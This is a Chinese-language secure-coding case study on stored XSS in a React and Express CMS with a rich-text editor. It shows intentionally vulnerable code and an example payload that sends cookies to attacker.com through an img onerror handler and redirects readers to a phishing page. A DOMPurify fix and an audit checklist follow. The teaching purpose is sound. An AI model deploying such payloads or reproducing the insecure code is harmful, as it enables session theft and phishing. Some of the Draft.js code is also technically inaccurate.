# 案例研究：React 富文本编辑器中的 XSS 漏洞

> **难度等级：** ★★★★★ (高级)
> **审计时间：** 70-100 分钟 (完整分析)
> **适用场景：** React + 富文本编辑器 + 后端存储

## 漏洞场景

一个 CMS 系统使用 React 和第三方富文本编辑器（如 Draft.js）编辑文章。文章包含用户上传的图片链接、外链等富媒体内容。

## 完整的漏洞代码

### 后端：Node.js + Express

```javascript
// ❌ 问题 1：后端直接保存原始 HTML
const express = require('express');
const app = express();

app.post('/api/articles', async (req, res) => {
  const { title, content, featured_image } = req.body;

  // 后端没有净化内容
  const article = {
    title,
    content,  // ❌ 直接保存可能包含恶意 HTML 的内容
    featured_image,
    author: req.user.id
  };

  await Article.create(article);
  res.json(article);
});

app.get('/api/articles/:id', async (req, res) => {
  const article = await Article.findById(req.params.id);
  res.json(article);  // ❌ 返回原始未净化的数据
});
```

### 前端：React 组件

```jsx
// ❌ 问题 2：React 编辑器未净化输出
import Editor from 'draft-js';

function ArticleEditor() {
  const [content, setContent] = useState(EditorState.createEmpty());

  const handlePublish = async () => {
    const html = convertToRaw(content.getCurrentContent());
    // ❌ 直接发送原始 HTML，未经净化
    await fetch('/api/articles', {
      method: 'POST',
      body: JSON.stringify({
        content: html,
        title: document.getElementById('title').value
      })
    });
  };

  return (
    <div>
      <input id="title" />
      <Editor editorState={content} onChange={setContent} />
      <button onClick={handlePublish}>发布</button>
    </div>
  );
}
```

### 文章展示页面

```jsx
// ❌ 问题 3：前端直接渲染未净化的 HTML
function ArticleView({ articleId }) {
  const [article, setArticle] = useState(null);

  useEffect(() => {
    fetch(`/api/articles/${articleId}`)
      .then(r => r.json())
      .then(data => setArticle(data));
  }, [articleId]);

  if (!article) return <div>Loading...</div>;

  return (
    <article>
      <h1>{article.title}</h1>
      {/* ❌ 直接使用 dangerouslySetInnerHTML，未净化 */}
      <div dangerouslySetInnerHTML={{ __html: article.content }} />
    </article>
  );
}
```

## 攻击向量

编辑者提交以下内容：

```html
<p>正常的文章内容...</p>
<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
<script>
  // 或者直接注入脚本
  window.location = 'https://attacker.com/phishing';
</script>
```

## 完整修复方案

### 步骤 1：后端验证和净化

```javascript
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/articles', async (req, res) => {
  const { title, content } = req.body;

  // 1. 验证输入
  if (!title || !content) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  // 2. 净化 HTML 内容，仅允许基础格式化标签
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li',
      'h1', 'h2', 'h3', 'blockquote', 'a', 'img'
    ],
    ALLOWED_ATTR: {
      'a': ['href', 'title'],
      'img': ['src', 'alt', 'width', 'height']
    },
    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]*(?:[^a-z+.\-:]|$))/i
  });

  const article = {
    title,
    content: clean,  // ✅ 保存已净化的内容
    author: req.user.id
  };

  await Article.create(article);
  res.json(article);
});
```

### 步骤 2：前端编辑器防护

```jsx
import DOMPurify from 'dompurify';
import Editor from 'draft-js';

function ArticleEditor() {
  const [content, setContent] = useState(EditorState.createEmpty());

  const handlePublish = async () => {
    const html = convertToRaw(content.getCurrentContent());

    // 前端也进行净化（防御纵深）
    const clean = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'img'],
      ALLOWED_ATTR: {
        'a': ['href'],
        'img': ['src', 'alt']
      }
    });

    await fetch('/api/articles', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: clean,
        title: document.getElementById('title').value
      })
    });
  };

  return (
    <div>
      <input id="title" placeholder="文章标题" />
      <Editor editorState={content} onChange={setContent} />
      <button onClick={handlePublish}>发布</button>
    </div>
  );
}
```

### 步骤 3：前端显示防护

```jsx
import DOMPurify from 'dompurify';

function ArticleView({ articleId }) {
  const [article, setArticle] = useState(null);

  useEffect(() => {
    fetch(`/api/articles/${articleId}`)
      .then(r => r.json())
      .then(data => setArticle(data));
  }, [articleId]);

  if (!article) return <div>Loading...</div>;

  // 即使数据已经净化，仍然再次检查（防御 API 被篡改）
  const safContent = DOMPurify.sanitize(article.content);

  return (
    <article>
      <h1>{article.title}</h1>
      <div dangerouslySetInnerHTML={{ __html: safContent }} />
    </article>
  );
}
```

## 审计检查清单

- [ ] 编辑器是否使用成熟的库（Draft.js、Slate.js）？
- [ ] 后端是否对所有 HTML 输入进行了净化？
- [ ] 前端显示时是否再次净化？
- [ ] DOMPurify 配置是否正确？
- [ ] 是否限制了 URI 协议（防止 javascript: ）？
- [ ] 是否有 CSP 策略保护？
- [ ] 是否对图片 src 进行了验证？

## 关键要点

1. **富文本 = 高风险**：需要多层防护
2. **后端必须净化**：不要依赖前端
3. **前端也要防护**：防御 API 被篡改
4. **配置很重要**：DOMPurify 的白名单配置决定了安全性
5. **防御纵深**：多个安全层能抵御部分防护失效

